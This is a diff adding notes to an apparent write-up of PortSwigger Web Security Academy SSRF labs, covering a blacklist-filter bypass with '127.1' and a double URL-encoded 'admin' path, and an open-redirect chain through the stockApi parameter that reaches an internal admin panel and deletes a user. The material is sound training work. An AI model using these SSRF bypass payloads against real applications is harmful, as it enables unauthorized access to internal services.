@@ -25,3 +25,36 @@ ffuf -u 'https://0a98008d032d9726815dcf3f001c0047.web-security-academy.net/produ
 ```
 
 After this, one IP is revieled and we can access the admin pannel and remove the user with `stockApi` param set sa `http://192.168.0.26:8080/admin/delete?username=carlos`.
+
+## SSRF with blacklist-based input filter
+
+Using `stockApi` param as previously we can try to perform SSRF attack again, but this time it will be blocked.
+
+Iterative tries to bypass the block displayed as a list below:
+ - http://127.0.0.1/ - blocked
+ - http://127.1/ - not blocked, 200 response cotaining embeded home page
+ - http://127.1/admin - blocked
+ - http://127.1/administrator - blocked
+ - http://127.1/admin/1 - blocked
+ - http://127.1/1 - not blocked
+ - http://127.1/aDmIn - not blocked, but no results either
+ - http://127.1/admi - not blocked, "admin" substring must be detected and blocked
+ - http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65 (admin 2x times URL encoded) - not blocked and results in admin panel!
+
+Now that we have found a way to access the admin panel, we can remove the `carlos` user and solve the lab, using `stockApi` param with value `http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65/delete?username=carlos`
+
+## SSRF with filter bypass via open redirection vulnerability
+
+`GET /product/nextProduct` is vulnerable to open redirect. `path` param originaly is set as a relative path, but it accepts also full url and redirects to it without any issues.
+
+Providing `http://localhost:8080/admin` as `path` param responds with 302 status and redirects to `localhost` happily.
+
+This time `POST /product/stock` as `stockApi` param accepts only relative paths. Providing full URL responds with an error.
+
+We can make use of open redirect in relative path `/product/nextProduct` to make a redirect to a full URL.
+
+Making a `POST /product/stock` with param `stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//localhost/` responds with a homepage with visible navigation to `/admin` page, so we must bypass classic authentication or has a admin session somehow in the app.
+
+Adding `/admin` to previous endpoint fails, so according to lab description we should fetch `http://192.168.0.12:8080/admin`
+
+Making a `POST /product/stock` with param `stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin` accesses the admin panel and `stockApi=/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos` removes `carlos` user which solves the lab.
